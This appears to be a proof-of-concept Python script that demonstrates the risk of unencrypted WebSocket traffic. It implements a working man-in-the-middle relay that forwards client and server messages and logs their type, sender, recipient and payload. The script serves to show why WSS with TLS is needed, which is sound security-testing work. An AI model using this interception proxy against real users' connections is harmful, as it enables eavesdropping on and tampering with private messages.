"""
Proof of Concept: WebSocket Man-in-the-Middle Proxy

This script demonstrates a vulnerability where WebSocket communications are not encrypted,
allowing a malicious actor to intercept and potentially modify messages between client and server.
In a secure system, all communications should be encrypted (e.g., over WSS with TLS).

This PoC acts as a proxy that sits between the client and server, logging messages for inspection.
It exploits the lack of transport-level security to perform eavesdropping or tampering.
"""

import argparse
import asyncio
import datetime
import json

import websockets


async def pump(src, dst, label):
    """
    Forwards messages between source and destination WebSocket connections.
    Logs message details for inspection, demonstrating the vulnerability of unencrypted WS traffic.
    """
    try:
        async for msg in src:
            ts = datetime.datetime.now(datetime.UTC).isoformat()
            try:
                j = json.loads(msg)
                print(f"[{ts}] {label} {j.get('type')} from={j.get('from')} to={j.get('to')} payload={j.get('payload')}")
            except Exception:
                print(f"[{ts}] {label} raw: {msg[:120]!r}")
            await dst.send(msg)
    except websockets.ConnectionClosed:
        pass


async def main(listen_host, listen_port, server_host, server_port):
    """
    Sets up a server that forwards connections to the actual server, allowing interception.
    """
    async def handler(client_ws):
        uri = f"ws://{server_host}:{server_port}/ws"
        async with websockets.connect(uri) as server_ws:
            t1 = asyncio.create_task(pump(client_ws, server_ws, "C→S"))
            t2 = asyncio.create_task(pump(server_ws, client_ws, "S→C"))
            await asyncio.wait({t1, t2}, return_when=asyncio.FIRST_COMPLETED)

    print(f"[proxy] listening ws://{listen_host}:{listen_port}/ws -> ws://{server_host}:{server_port}/ws")
    async with websockets.serve(handler, listen_host, listen_port):
        await asyncio.Future()


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen-host", default="127.0.0.1")
    ap.add_argument("--listen-port", type=int, default=9090)
    ap.add_argument("--server-host", default="127.0.0.1")
    ap.add_argument("--server-port", type=int, default=8080)
    args = ap.parse_args()
    asyncio.run(main(**vars(args)))
